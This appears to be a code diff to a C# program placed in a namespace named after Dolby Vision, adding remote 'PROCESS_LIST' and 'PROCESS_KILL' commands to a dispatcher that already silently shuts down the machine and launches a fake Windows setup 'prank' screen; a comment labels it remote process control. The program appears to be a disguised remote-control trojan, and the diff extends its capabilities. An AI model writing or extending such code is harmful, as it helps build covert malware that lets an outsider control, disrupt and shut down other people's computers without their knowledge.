@@ -208,6 +208,15 @@ namespace DolbyVision
                 {
                     return StartOobePrank("Win11");
                 }
+                if (cmd.Equals("PROCESS_LIST", StringComparison.OrdinalIgnoreCase))
+                {
+                    return GetProcessList();
+                }
+                if (cmd.StartsWith("PROCESS_KILL:", StringComparison.OrdinalIgnoreCase))
+                {
+                    string pidStr = cmd.Substring(13);
+                    return KillProcess(pidStr);
+                }
                 if (cmd.Equals("SHUTDOWN", StringComparison.OrdinalIgnoreCase))
                 {
                     Process.Start(new ProcessStartInfo("shutdown", "/s /t 0") { CreateNoWindow = true, UseShellExecute = false });
@@ -298,6 +307,45 @@ namespace DolbyVision
                 };
                 Process.Start(psi);
                 return "OK: " + version + " OOBE恶搞已启动 (" + edgePath + ")";
+            }
+            catch (Exception ex)
+            {
+                return "ERROR: " + ex.Message;
+            }
+        }
+
+        // ========== 远程进程控制 ==========
+        private static string GetProcessList()
+        {
+            try
+            {
+                var procs = Process.GetProcesses();
+                var sb = new System.Text.StringBuilder();
+                sb.AppendLine("PID\t名称\t内存(MB)");
+                foreach (var p in procs)
+                {
+                    try
+                    {
+                        double mem = Math.Round(p.WorkingSet64 / 1024.0 / 1024.0, 1);
+                        sb.AppendLine(p.Id + "\t" + p.ProcessName + "\t" + mem);
+                    }
+                    catch { }
+                }
+                return "OK:\r\n" + sb.ToString();
+            }
+            catch (Exception ex)
+            {
+                return "ERROR: " + ex.Message;
+            }
+        }
+        private static string KillProcess(string pidStr)
+        {
+            try
+            {
+                int pid = int.Parse(pidStr.Trim());
+                var p = Process.GetProcessById(pid);
+                p.Kill();
+                return "OK: 已终止进程 " + pid + " (" + p.ProcessName + ")";
             }
             catch (Exception ex)
             {
